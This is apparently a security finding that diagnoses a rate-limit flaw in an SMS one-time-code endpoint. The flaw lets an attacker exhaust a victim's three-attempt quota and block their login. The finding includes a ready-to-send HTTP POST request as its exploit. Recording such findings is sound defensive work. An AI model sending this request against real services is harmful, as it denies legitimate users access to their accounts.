diagnosis: The SMS OTP dispatch route consumes rate limiter points keyed solely by phoneNumber provided in the request body without checking if the phone number belongs to the authenticated account. An attacker can repeatedly trigger OTP requests for a target user's phone number to exhaust their 3-attempts quota and deny them login access.
exploit_request:
POST /api/v2/auth/send-sms-code HTTP/1.1
Host: id.enterprise-sso.com:9004
Authorization: Bearer <attacker_guest_session>
Content-Type: application/json

{"phoneNumber": "+12025550199"}
